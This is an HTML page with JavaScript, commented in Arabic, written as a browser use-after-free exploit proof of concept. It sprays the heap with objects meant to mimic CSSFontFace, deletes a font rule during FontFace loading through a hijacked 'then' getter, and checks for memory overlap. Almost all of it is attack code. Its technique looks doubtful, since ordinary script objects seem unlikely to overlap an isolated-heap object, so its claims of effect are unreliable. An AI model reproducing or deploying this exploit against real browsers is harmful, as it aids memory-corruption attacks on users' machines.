<!DOCTYPE html>
<html>
<head>
    <style id="fontStyle">
        @font-face { font-family: 'TargetFont'; src: url(nonexistent.woff); }
    </style>
</head>
<body>
    <div id="status">Status: Waiting for Trigger...</div>

    <script>
        const status = document.getElementById('status');
        let sprayedObjects = [];

        // 1. التأسيس: هيكل البيانات للتداخل (Heap Grooming)
        function performGrooming() {
            status.innerHTML = "Status: Grooming Heap...";
            // كائنات تحاكي حجم CSSFontFace في الـ IsoHeap
            for (let i = 0; i < 2000; i++) {
                sprayedObjects.push({
                    a: 0x41414141,
                    b: i,
                    c: 0x42424242,
                    d: 0x43434343
                });
            }
        }

        // 2. المُشغل (Trigger): الـ UAF
        function triggerUAF() {
            status.innerHTML = "Status: Triggering UAF...";
            
            let font = new FontFace('TargetFont', 'local(Arial)', { unicodeRange: 'U+0041' });
            document.fonts.add(font);
            
            // استغلال الفجوة الزمنية (Race Condition)
            Object.defineProperty(FontFace.prototype, 'then', {
                get() {
                    // حذف الكائن الأصلي هنا (Use-After-Free)
                    document.getElementById('fontStyle').sheet.deleteRule(0);
                    
                    // استدعاء عملية الملء فوراً بعد الحذف
                    performGrooming();
                    return undefined;
                }
            });

            // بدء التحميل
            font.load();
        }

        // 3. التحقق (Verification): كشف تداخل الذاكرة
        function verifyExploit() {
            status.innerHTML = "Status: Verifying memory...";
            let corrupted = false;
            
            for (let i = 0; i < sprayedObjects.length; i++) {
                // فحص ما إذا كان الـ StructureID أو البيانات قد تغيرت
                if (sprayedObjects[i].a !== 0x41414141) {
                    status.innerHTML = "SUCCESS: Memory overlap detected at index " + i;
                    corrupted = true;
                    break;
                }
            }
            
            if (!corrupted) {
                status.innerHTML = "Status: Buffers intact (No overlap).";
            }
        }

        // التنفيذ
        window.onload = () => {
            setTimeout(triggerUAF, 1000);
            setTimeout(verifyExploit, 3000);
        };
    </script>
</body>
</html>
